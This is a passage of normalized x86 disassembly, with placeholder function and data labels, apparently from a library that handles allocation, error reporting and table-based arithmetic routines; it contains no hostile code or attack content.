test eax eax
je r-xdata
mov eax [ esp + 0x70 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov edx [ esp + 0x80 ]
sar esi 0x1
push edx
mov edx [ esp + 0x6c ]
mov ecx [ eax + esi * 4 ]
mov eax [ esp + 0x70 ]
push ecx
push eax
push eax
push edx
call sub_1002d830
add esp 0x14
test eax eax
je r-xdata
mov edx [ edi ]
mov ecx [ esp + 0x6c ]
sar esi 0x1
mov eax [ edx + esi * 4 ]
push eax
push ecx
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
xor ecx ecx
test eax eax
sete cl
mov [ esp + 0x40 ] ecx
mov ecx [ esp + 0x80 ]
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x68 ]
push ecx
push edx
push eax
call sub_1002d920
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x70 ] 0x0
jmp r-xdata
sub_1004e3d0
push esi
mov esi [ esp + 0x8 ]
push 0x7f
push r--data
push 0x24
lea eax [ esi + 0x18 ]
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
mov eax esi
pop esi
retn
sub_1004e3f0
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push 0x8c
push r--data
push 0x24
lea eax [ edi + 0x18 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
push esi
mov esi [ edi + 0x10 ]
test esi esi
je r-xdata
push edi
call sub_1001d740
add esp 0x4
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ edi + 0x10 ]
push ecx
call sub_1001d740
add esp 0x4
push eax
call sub_1002d200
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
sub_1004e450
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push 0xa3
push r--data
push 0x24
lea eax [ edi + 0x18 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
push esi
mov esi [ edi + 0x10 ]
test esi esi
je r-xdata
push 0x4
push edi
call sub_10026870
push edi
call sub_1001d740
add esp 0xc
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ edi + 0x10 ]
push 0x4
push ecx
call sub_10026870
mov edx [ edi + 0x10 ]
push edx
call sub_1001d740
add esp 0xc
push eax
call sub_1002d230
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
sub_1004e4d0
mov eax 0x14
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x1c ]
push ebp
mov ebp 0x1
mov eax [ ebx + 0x4 ]
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] ebp
jne r-xdata
mov edi [ esp + 0x2c ]
test edi edi
jle r-xdata
push 0xca
push r--data
push ebp
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push 0xd7
cmp edi 0x7
jg r-xdata
mov ecx [ esp + 0x30 ]
mov [ eax ] 0x0
pop edi
pop esi
mov [ ecx ] ebp
pop ebp
pop ebx
add esp 0x14
retn
push 0xcd
push r--data
push 0x41
jmp r-xdata
mov eax [ ebx + 0xc ]
mov ecx edi
shl ebp cl
test eax eax
lea esi [ ebp + ebp - 0x1 ]
mov [ esp + 0x18 ] esi
je r-xdata
push 0x8f
push 0x10
call sub_1001de60
mov ecx [ esp + 0x24 ]
add esp 0x14
push ecx
call sub_1001d740
add esp 0x4
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push ebx
call sub_10029870
mov [ esp + 0x30 ] eax
inc eax
push 0xe4
push r--data
push eax
mov [ esp + 0x30 ] eax
call sub_1001d4c0
add esp 0x10
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov eax [ ebx ]
test eax eax
je r-xdata
push 0xe9
push r--data
push 0x41
jmp r-xdata
push 0xef
jmp r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
push r--data
push 0x44
mov ebx [ eax ]
mov eax [ esp + 0x10 ]
and ebx esi
xor esi esi
sub eax edi
mov [ esp + 0x1c ] eax
xor eax eax
test bl 0x1
je r-xdata
mov eax [ esp + 0x2c ]
lea edx [ esi + edi + 0x1 ]
cmp edx eax
jae r-xdata
imul [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
add ecx esi
inc esi
mov [ ecx + edi ] al
mov eax [ esp + 0x28 ]
lea edx [ esi + edi ]
push edx
push eax
call sub_1002a150
imul eax ebp
sar ebx 0x1
add ebx eax
lea eax [ ebp + ebp ]
add esp 0x8
cmp ebx eax
jg r-xdata
test ebp ebx
mov eax ebx
je r-xdata
cmp esi [ esp + 0x20 ]
jbe r-xdata
push 0x12c
jmp r-xdata
jmp r-xdata
mov edx ebp
neg edx
cmp eax edx
jle r-xdata
mov edx [ esp + 0x2c ]
lea ecx [ ebp + ebp ]
sub eax ecx
lea ecx [ esi + edi + 0x1 ]
cmp ecx edx
jb r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ edx ] esi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push 0x133
jmp r-xdata
test ebx ebx
jne r-xdata
push 0x115
jmp r-xdata
cmp eax ebp
jge r-xdata
mov eax [ esp + 0x18 ]
sar eax 0x1
and eax ebx
test al 0x1
je r-xdata
sub ebx eax
je r-xdata
lea ecx [ ebp + ebp ]
cmp ebx ecx
je r-xdata
cmp ebx ebp
jne r-xdata
push 0x120
jmp r-xdata
sub_1004e6d0
mov eax 0x34
call sub_1001d0d0
push ebp
push esi
push edi
mov edi [ esp + 0x44 ]
push sub_1004e450
push sub_1004e3f0
lea eax [ edi + 0x44 ]
xor ebp ebp
push sub_1004e3d0
push eax
mov [ esp + 0x28 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x3c ] ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x40 ] ebp
mov [ esp + 0x4c ] eax
call sub_1002d0b0
add esp 0x10
cmp edi ebp
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x34
retn
push 0x69
push r--data
push 0x1c
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi ebp
jne r-xdata
push ebx
mov ebx esi
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] 0x8
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] 0x4
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] 0x1
mov [ esp + 0x2c ] ebx
call sub_1002cb10
add esp 0x4
mov [ esp + 0x38 ] eax
test eax eax
jne r-xdata
push 0x6c
push r--data
push 0x41
push 0xc4
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x4c ]
test eax eax
jne r-xdata
push 0x30f
push r--data
push 0x71
jmp r-xdata
mov ebp [ esp + 0x4c ]
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x4c ] eax
je r-xdata
push 0xbc
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
push ebp
push ebx
push edi
call sub_1002cb20
add esp 0xc
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_1002de00
add esp 0x4
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
test ebp ebp
pop ebx
je r-xdata
push 0x8c
push r--data
push 0x24
lea edx [ ebx + 0x18 ]
push 0xffffffff
push edx
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov ebp [ esp + 0x18 ]
mov ebx [ esp + 0x28 ]
push eax
call sub_1002dcb0
add esp 0x4
push ebx
call sub_10029870
add esp 0x4
mov ecx 0x4
cmp eax 0x7d0
mov [ esp + 0x48 ] ecx
jae r-xdata
push 0x321
push r--data
push 0x72
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp ]
mov esi ebp
test eax eax
je r-xdata
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
mov [ esp + 0x48 ] 0x6
jmp r-xdata
cmp eax 0x320
jae r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1002d200
add esp 0x4
push ebp
call sub_1001d740
add esp 0x4
push eax
call sub_1002d200
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
push ebx
call sub_1001d740
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esp + 0x48 ]
add eax 0x7
shr eax 0x3
dec ecx
mov ebx 0x1
shl ebx cl
push 0x33a
push r--data
mov [ esp + 0x28 ] eax
mov [ esp + 0x34 ] ebx
imul ebx eax
lea edx [ ebx * 4 + 0x4 ]
mov [ esp + 0x44 ] ebx
push edx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov [ esp + 0x48 ] 0x5
jmp r-xdata
cmp eax 0x12c
jae r-xdata
mov eax [ esp + 0x30 ]
pop edi
pop esi
pop ebp
add esp 0x34
retn
push eax
call sub_1002d200
add esp 0x4
mov eax [ ebx + 0x10 ]
push eax
call sub_1001d740
add esp 0x4
push eax
call sub_1002d200
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
test ebx ebx
mov ebp eax
mov [ eax + ebx * 4 ] 0x0
mov [ esp + 0x14 ] 0x0
jbe r-xdata
push 0x33d
jmp r-xdata
cmp eax 0x46
jae r-xdata
push edi
call sub_1002d150
add esp 0x4
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
mov [ esp + 0x24 ] eax
push r--data
push 0x41
cmp eax 0x14
sbb edx edx
add edx 0x2
cmp edx ecx
jbe r-xdata
push 0x34e
push edi
call sub_1002d150
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push 0x347
jmp r-xdata
mov eax [ esp + 0x14 ]
mov edx ecx
inc eax
add edx 0x4
cmp eax ebx
mov [ esp + 0x14 ] eax
mov [ esp + 0x24 ] edx
jb r-xdata
cmp eax 0x320
jb r-xdata
mov edx [ esp + 0x38 ]
push edx
push eax
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
push edi
call sub_1002d150
mov ecx [ esp + 0x28 ]
add esp 0x4
test eax eax
mov [ ecx ] eax
je r-xdata
cmp eax 0x12c
jae r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x0
test eax eax
jbe r-xdata
mov [ esp + 0x48 ] ecx
cmp eax 0x46
jb r-xdata
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x18 ]
push edx
push eax
push ebx
push edi
call sub_1002db10
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push edi
call sub_1002d8b0
add esp 0x10
test eax eax
je r-xdata
cmp eax 0x14
sbb ecx ecx
add ecx 0x2
mov [ esp + 0x48 ] 0x3
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x18 ]
push sub_1004e450
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x44 ]
push sub_1004e3f0
mov [ esi ] edi
push sub_1004e3d0
xor edi edi
push esi
push ecx
mov [ esi + 0x4 ] 0x8
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] eax
mov [ esp + 0x2c ] edi
mov [ esi + 0x14 ] ebx
call sub_1002cfc0
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ebp ]
push ecx
push eax
add ebp 0x4
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x28 ] edi
mov [ esp + 0x34 ] 0x1
jmp r-xdata
mov eax [ esp + 0x2c ]
mov ebx 0x1
cmp eax ebx
jbe r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
dec eax
cmp ecx eax
jae r-xdata
mov edx [ esp + 0x4c ]
mov eax [ ebp - 0x4 ]
mov ecx [ esp + 0x1c ]
push edx
mov edx [ ebp ]
push eax
push ecx
push edx
push edi
call sub_1002d830
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
inc eax
cmp eax ecx
mov [ esp + 0x14 ] eax
jb r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
push ecx
push edx
push eax
push edi
call sub_1002d8b0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
inc ebx
add ebp 0x4
cmp ebx eax
jb r-xdata
mov ebx [ esp + 0x3c ]
mov ebx 0x2
inc ebx
cmp ebx 0x8
jb r-xdata
mov ecx [ esp + 0x4c ]
mov eax [ esp + 0x10 ]
push ecx
push eax
push eax
push edi
call sub_1002d8b0
add esp 0x10
test eax eax
je r-xdata
sub_1004ebe0
push ebx
push ebp
push esi
push edi
call sub_1005aea0
push eax
call sub_1002c320
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov edi [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edi
push ebx
push ebp
push eax
push esi
call sub_1002cc00
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
call sub_1001e020
mov ecx eax
and ecx 0xff000000
cmp ecx __dos_header
jne r-xdata
push esi
call sub_1002c490
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
and eax 0xfff
cmp eax 0x87
je r-xdata
call sub_1001df60
push esi
call sub_1002c490
call sub_1005aa10
push eax
call sub_1002c320
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp eax 0x88
jne r-xdata
mov edx [ esp + 0x14 ]
push edi
push ebx
push ebp
push edx
push esi
call sub_1002cc00
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1004eca0
push esi
call sub_1005b1a0
push eax
call sub_1002c320
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
push esi
call sub_1002cc50
add esp 0x14
test eax eax
jne r-xdata
pop esi
retn
mov eax esi
pop esi
retn
push esi
call sub_1002c490
add esp 0x4
xor eax eax
pop esi
retn
sub_1004ecf0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push esi
push 0x83
push r--data
push 0x18
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
xor eax eax
retn
mov [ esi ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x86
push r--data
push 0x41
push 0x65
push 0x2b
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x0
call sub_1005c940
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_1005c660
mov [ rw-data ] eax
mov ecx [ esi + 0xc ]
lea eax [ esi + 0x10 ]
push eax
push esi
mov edx [ ecx + 0x8 ]
push 0xd
mov [ esi + 0x8 ] edx
call sub_1001f420
add esp 0xc
mov eax esi
pop esi
retn
push eax
call sub_1005c960
add esp 0x4
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push 0x96
push r--data
push 0x26
push 0x65
push 0x2b
call sub_1001de60
mov eax [ esi + 0x4 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor eax eax
pop esi
retn
sub_1004edc0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x10 ]
push eax
push esi
push 0xd
call sub_1001f490
push 0x18
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0x18
pop esi
retn
push eax
call sub_10022640
add esp 0x4
sub_1004ee00
push esi
push edi
mov edi [ esp + 0xc ]
push sub_1004edc0
push sub_1004edc0
push sub_1004ecf0
push edi
call sub_100294a0
add esp 0x10
test eax eax
jne r-xdata
mov esi eax
pop edi
pop esi
retn
push 0x83
push r--data
push 0x18
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov [ esi ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x86
push r--data
push 0x41
push 0x65
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x0
call sub_1005c940
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_1005c660
mov [ rw-data ] eax
test esi esi
jne r-xdata
mov ecx [ esi + 0xc ]
lea eax [ esi + 0x10 ]
push eax
push esi
mov edx [ ecx + 0x8 ]
push 0xd
mov [ esi + 0x8 ] edx
call sub_1001f420
add esp 0xc
push eax
call sub_1005c960
add esp 0x4
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push sub_1004edc0
push sub_1004edc0
push sub_1004ecf0
push esi
push edi
call sub_100294c0
add esp 0x14
mov eax esi
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
push 0x96
push r--data
push 0x26
push 0x65
push 0x2b
call sub_1001de60
mov eax [ esi + 0x4 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor esi esi
jmp r-xdata
sub_1004efb0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_10029950
add esp 0x4
sub_1004f050
mov eax 0x14
call sub_1001d0d0
push esi
lea eax [ esp + 0x8 ]
push edi
push eax
mov [ esp + 0xc ] 0x0
or edi 0xffffffff
call sub_1002aa30
mov ecx [ esp + 0x28 ]
mov edx [ ecx ]
push edx
call sub_10022ae0
push eax
call sub_100229a0
push eax
call sub_10021b20
add esp 0x10
test eax eax
jne r-xdata
push 0x0
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_1002aa50
add esp 0xc
test eax eax
jne r-xdata
push 0x92
push r--data
push 0xa1
push 0xc5
push 0xd
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_100325c0
mov esi eax
mov eax [ esp + 0x14 ]
add esp 0xc
test eax eax
jne r-xdata
push 0x98
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
call sub_1002b000
add esp 0x4
mov eax edi
pop edi
pop esi
add esp 0x14
retn
push esi
lea ecx [ esp + 0x10 ]
push eax
push ecx
call sub_1002ab80
mov edx [ esp + 0x14 ]
push esi
push edx
call sub_10026870
mov eax [ esp + 0x1c ]
push eax
call sub_1001d740
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x48 ]
push ecx
lea ecx [ esp + 0x28 ]
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push edx
push eax
push ecx
call sub_1002bdb0
add esp 0x28
test eax eax
jg r-xdata
push 0xa1
push r--data
push 0x41
push 0xc5
push 0xd
call sub_1001de60
add esp 0x14
jmp r-xdata
push r--data
push 0x6
push 0xc5
push 0xd
call sub_1001de60
add esp 0x14
xor edi edi
jmp r-xdata
mov edi 0x1
push 0xad
sub_1004f190
mov eax [ esp + 0x8 ]
push esi
mov esi [ eax ]
mov eax [ esp + 0x8 ]
cmp eax 0x1
jne r-xdata
mov eax 0x1
pop esi
retn
call sub_1001e3c0
test eax eax
mov [ esi + 0x18 ] eax
jne r-xdata
pop esi
retn
sub_1004f1e0
mov eax 0x4
call sub_1001d0d0
mov ecx [ esp + 0xc ]
lea eax [ esp ]
push esi
push eax
push ecx
mov [ esp + 0xc ] 0x0
xor esi esi
call sub_1004f250
add esp 0x8
test eax eax
jl r-xdata
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x4 ]
mov edx [ esp + 0xc ]
push edx
push eax
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x18 ]
push eax
push ecx
call sub_10030ec0
add esp 0x10
mov esi eax
mov eax esi
pop esi
pop ecx
retn
push eax
call sub_1001dca0
add esp 0x4
sub_1004f250
mov eax 0x34
call sub_1001d0d0
push ebx
push ebp
push esi
xor esi esi
push edi
mov [ esp + 0x10 ] esi
xor ebp ebp
call sub_1001dc60
mov ebx eax
cmp ebx esi
jne r-xdata
call sub_1001df60
push 0xa1
push r--data
push 0x41
push 0x6b
push 0xd
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x34
retn
mov edi [ ebx + 0x4 ]
mov eax esi
sub eax ebp
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x2c ]
push ecx
lea eax [ esp + 0x38 ]
push edx
lea ecx [ esp + 0x24 ]
add edi ebp
push eax
push ecx
mov [ esp + 0x2c ] edi
call sub_1002e880
add esp 0x14
mov [ esp + 0x24 ] eax
test al 0x80
je r-xdata
mov edi ebp
sub edi esi
add edi 0x8
lea eax [ esi + edi ]
push eax
push ebx
call sub_1001dd90
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
sub edx edi
add ebp edx
test al 0x1
mov eax [ esp + 0x10 ]
je r-xdata
call sub_1001e000
and eax 0xfff
cmp eax 0x9b
jne r-xdata
push 0xae
push r--data
push 0x41
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ esp + 0x48 ]
add ecx esi
push edi
push ecx
push edx
call sub_10020930
add esp 0xc
test eax eax
jge r-xdata
mov edi [ esp + 0x30 ]
test eax eax
je r-xdata
inc eax
mov [ esp + 0x10 ] eax
jmp r-xdata
push ebx
call sub_1001dca0
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x34
retn
call sub_1001df60
mov eax [ esp + 0x24 ]
push 0x6b
push 0xd
call sub_1001de60
add esp 0x14
jle r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov ecx esi
sub ecx ebp
cmp edi ecx
jle r-xdata
test edi edi
jne r-xdata
mov eax esi
sub eax ebp
cmp eax 0x8
mov [ esp + 0x14 ] eax
jg r-xdata
add esi eax
push 0xb4
jmp r-xdata
test eax eax
add ebp edi
test eax eax
jle r-xdata
sub edi esi
add edi ebp
lea edx [ esi + edi ]
push edx
push ebx
call sub_1001dd90
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
test ecx ecx
jne r-xdata
push r--data
push 0x8e
mov edx [ esp + 0x4c ]
pop edi
mov eax ebp
pop esi
mov [ edx ] ebx
pop ebp
pop ebx
add esp 0x34
retn
jmp r-xdata
push 0xe5
push r--data
push 0x41
jmp r-xdata
test edi edi
jle r-xdata
dec eax
test eax eax
mov [ esp + 0x10 ] eax
jle r-xdata
mov edi [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
mov eax [ ebx + 0x4 ]
mov ecx [ esp + 0x48 ]
add eax esi
push edi
push eax
push ecx
call sub_10020930
add esp 0xc
test eax eax
jle r-xdata
jmp r-xdata
push 0xee
sub edi eax
add esi eax
test edi edi
jg r-xdata
sub_1004f5b0
mov eax [ esp + 0x4 ]
push esi
test eax eax
jne r-xdata
mov ecx [ eax ]
test ecx ecx
jne r-xdata
push 0x3f4
push r--data
push 0x7c
push 0x9e
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
cmp ecx 0x1
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
call sub_10022ae0
push eax
call sub_1002df90
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp ecx 0x2
je r-xdata
mov ecx [ eax + 0x4 ]
push ecx
call sub_1004f690
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x1
push esi
call sub_1002cb60
add esp 0x8
mov eax esi
pop esi
retn
push 0x3fe
push r--data
push 0x77
push 0x9e
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
xor eax eax
pop esi
retn
push 0x414
push r--data
push 0x73
push 0x9e
push 0x10
call sub_1001de60
add esp 0x14
push 0x0
push esi
call sub_1002cb60
add esp 0x8
mov eax esi
pop esi
retn
push 0x409
push r--data
push 0x10
push 0x9e
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1004f690
mov eax 0x10
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
xor edi edi
mov eax [ ebp + 0x4 ]
mov [ esp + 0x10 ] edi
cmp eax edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] edi
je r-xdata
push 0x2ef
cmp [ eax ] edi
je r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x1c ]
xor ebx ebx
cmp [ eax + 0x4 ] edi
je r-xdata
test edi edi
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_10029950
add esp 0x4
push 0x2f8
jmp r-xdata
mov eax [ ecx ]
cmp eax edi
je r-xdata
test ebp ebp
je r-xdata
push esi
call sub_10029950
add esp 0x4
push r--data
push 0x73
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ eax + 0x8 ]
cmp edx edi
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x10
retn
push ebp
call sub_1002d200
add esp 0x4
mov ecx [ ecx + 0x4 ]
cmp ecx edi
je r-xdata
cmp [ ecx + 0x8 ] edi
je r-xdata
mov eax [ eax ]
push edi
push eax
push edx
call sub_10029d50
add esp 0xc
cmp eax edi
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
mov eax [ ecx + 0x4 ]
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push edx
push eax
call sub_10029d50
add esp 0xc
cmp eax edi
mov [ esp + 0x14 ] eax
jne r-xdata
push 0x2fe
push r--data
push 0x3
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ ebp + 0x4 ]
mov edx [ ecx ]
push edx
call sub_10022ae0
add esp 0x4
cmp eax 0x197
jne r-xdata
push 0x304
push r--data
push 0x3
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp eax 0x196
jne r-xdata
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ esi ]
cmp eax 0x295
mov [ esp + 0x24 ] eax
jle r-xdata
push 0x383
push r--data
push 0x67
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x4 ]
cmp eax edi
jne r-xdata
call sub_100299b0
mov ebx eax
cmp ebx edi
mov [ esp + 0x10 ] ebx
jne r-xdata
push 0x314
push r--data
push 0x8a
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
push edi
push eax
call sub_1002f620
add esp 0x8
cmp eax edi
mov [ esp + 0x10 ] eax
jne r-xdata
push 0x367
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_10022ae0
add esp 0x4
cmp eax 0x2aa
jne r-xdata
push 0x31a
push r--data
push 0x41
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp [ eax + 0xc ] edi
jne r-xdata
push 0x36d
push r--data
push 0xd
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp eax 0x2ab
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
jne r-xdata
push 0x373
push r--data
push 0x67
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp [ eax + 0x4 ] edi
je r-xdata
cmp eax 0x2a9
jne r-xdata
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
push eax
call sub_1002f4d0
mov esi [ esi ]
mov edi eax
add esp 0x4
cmp esi edi
jle r-xdata
push 0x327
jmp r-xdata
push eax
call sub_10029870
add esp 0x4
cmp eax 0x295
mov [ esp + 0x24 ] eax
jle r-xdata
push 0x35a
jmp r-xdata
push 0x355
push r--data
push 0x7e
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov esi [ esi ]
mov eax [ edi + 0x8 ]
cmp esi eax
jle r-xdata
push 0x342
jmp r-xdata
push 0x32f
push r--data
push 0x89
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
test edi edi
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
push 0x0
push eax
push ecx
push edx
call sub_1004ebe0
push 0x37a
push r--data
push 0x8a
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x348
push r--data
push 0x84
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ edi + 0x4 ]
